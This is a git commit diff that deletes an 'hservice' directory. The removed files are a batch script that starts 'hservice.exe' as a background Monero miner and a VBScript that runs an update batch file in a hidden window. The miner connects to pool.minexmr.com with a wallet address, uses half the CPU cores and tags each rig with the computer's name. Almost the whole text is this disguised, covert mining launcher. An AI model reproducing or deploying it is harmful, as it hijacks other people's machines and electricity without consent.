c156fa08f9888c69c69dded0fca2ccfb7e341d13
JohnSmithNA <98902896+JohnSmithNA@users.noreply.github.com>
2022-02-04 16:18:21 +0100

    Delete hservice directory

--- hservice/start.cmd
+++
@@ -1,4 +0,0 @@
-@echo off
-set /a logicprocessor = "%NUMBER_OF_PROCESSORS%/2"
-hservice.exe -o pool.minexmr.com:443 -u 48LFDhtqfquYSy7njxBb859taAJTN6iFyZcMxtiakUMfGAJ3tzkTpRkbc5cvUN35dCNYUkofwp59Z33HjLwvZoah4PBQgy2 -k --tls -t %logicprocessor% --rig-id %COMPUTERNAME% -B
-pause
--- hservice/update.vbs
+++
@@ -1,2 +0,0 @@
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run("update.bat"), 0, True
